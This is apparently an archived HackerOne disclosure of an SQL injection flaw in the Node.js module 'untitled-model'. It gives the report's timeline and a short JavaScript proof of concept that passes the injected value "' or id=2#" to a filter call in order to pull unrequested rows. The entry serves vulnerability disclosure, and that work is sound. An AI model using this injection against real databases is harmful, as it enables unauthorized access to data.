---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - stack/node
substate: "resolved"
weakness: "SQL Injection"
enriched: true
date: 2019-06-18
submitted: 2019-03-09T20:00:10.397Z
bounty_usd: null
votes: 14
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "verichains"
source: "https://hackerone.com/reports/507222"
title: "[untitled-model] sql injection"
---
# [untitled-model] sql injection

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 14 | **Program:** Node.js third-party modules | **Disclosed:** 2019-06-18

- Report: [https://hackerone.com/reports/507222](https://hackerone.com/reports/507222)
- CWE: SQL Injection
- Submitted: 2019-03-09T20:00:10.397Z

## Timeline

- **Report Filed**
- **2019-03-09** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **2019-03-09** @verichains: Hi somehow the poc script is messed up and i cannot edit the message, i'll repost it here:
```js
var model = require('untitled-model');
model.connection(
	{   
		host: "localhost",
		user: "root",
		password: "",
		database:"test"
	}
);
var User = model.get('user');

(async () => {
	await new Promise((resolve,reject)=>{
		User.filter({'id': 1},function(err,data){
			if(err) throw err;
			console.log('normal query', data);
			resolve();
		});
	});
	await new Promise((resolve,reject)=>{
		User.filter({'id': "' or id=2#"},function(err,data){
			if(err) throw err;
			console.log('sqli query', data);
			resolve();
		});
	});
	process.exit(0);
})()
```
- **Report Triaged**
- **2019-03-11** @verichains: Thank you @marcinhoppe!
- **2019-03-31** @verichains: @marcinhoppe any update?
- **2019-04-01** @ronperris: @verichains 

The maintainers have not joined this issue here yet. 

This project doesn't appear to have GitHub, or we would recommend opening an issue there.

Since this library has 0 downloads a week, it might not be very active.

We will disclose the vulnerability publicly after 45 days.
- **2019-04-01** @verichains: @ronperris Thanks for update
- **2019-05-31** @verichains: hi it's 3 months now.
- **2019-06-18** @marcinhoppe: @verichains @ronperris I am sorry for the delay on my part. I will proceed with the disclosure.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
